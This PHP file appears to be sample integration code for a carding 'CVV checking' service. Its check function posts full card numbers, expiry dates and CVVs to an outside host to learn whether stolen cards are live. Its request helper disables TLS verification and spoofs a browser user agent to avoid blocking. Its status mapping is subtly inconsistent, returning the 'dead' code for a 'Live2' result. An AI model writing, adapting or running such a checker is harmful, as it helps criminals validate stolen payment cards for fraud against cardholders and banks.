<?php
if ( count(get_included_files()) === 1 ){
    include __DIR__ . '/../includes/errors/404.php';
}
?>
<?php
error_reporting(0);
set_time_limit(30);


/*==================================================================
Example php code to using API Checking with www.UG-Market.com
Require: Your host/server must supports php, curl

ug-market domain list:
ug-market.com
ug-market.net
ug-market.is
The Best Cvv Checking Service since 2011
===================================================================*/

function check($ccnum,$ccm,$ccy,$cvv,$debug){
	$user 	= "";									// Your Username
	$pwd	= "";									// Your Password
	$gate	= "";										// The tool you want to checking with

	$url	= "https://ugrn.linkzip.pw/ugm/xcheck.php";
	$data	= "user=".$user."&pwd=".$pwd."&gate=".$gate."&cc=".$ccnum."|".$ccm."|".$ccy."|".$cvv;
	$send	= _curl($url,$data,$debug);
	if ($debug == 1) {
		return $send;
	}
	if($send == -200){
		return -200;
	}
	else{
		$result = Re($send,'Status=([^"]*)_');					// user preg_match to catch response
		if($result == "Invalid")
	    {
			return -1;
	    }
		elseif($result == "Live")
	    {
			return 1;
	    }
	    elseif($result == "Live2")		// Live2 (with checkcvv5 only) means: info of CC (CCNum, Exp, Cvv2) is valid, but cannot charge $ while check
	    {
			return 2;
	    }
	    elseif($result == "Die")
	    {
			return 2;
	    }
	    elseif($result == "Error")
	    {
			return 3;
	    }
	    else
	    {
			return 4;
	    }
	    
	    //1 = LIVE
	    //2 = DEAD
	    //3 = API ERROR
	    //4 = UNKNOWN
	}
}

function _curl($url, $post="", $debug=""){
	$ch = curl_init();
	if($post){
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	}
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0");	// You'll be blocked if not set USERAGENT
	if(stristr($url, "https")){
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	}
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 4);	// Set connection timeout
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);	// Set curl timeout (total time)
	$result=curl_exec($ch);
	if ($debug == 1) {
		return $result;
	}
	$info = curl_getinfo($ch);
	curl_close($ch);
	if($info['http_code'] != "200"){
		return $info['http_code'];
	}
	else return $result;
}

function R($s,$e){
	preg_match("/".$e."/",$s,$m);
	return $m[1];
}
function Re($s,$e){
	return html_entity_decode(R($s,$e));
}

?>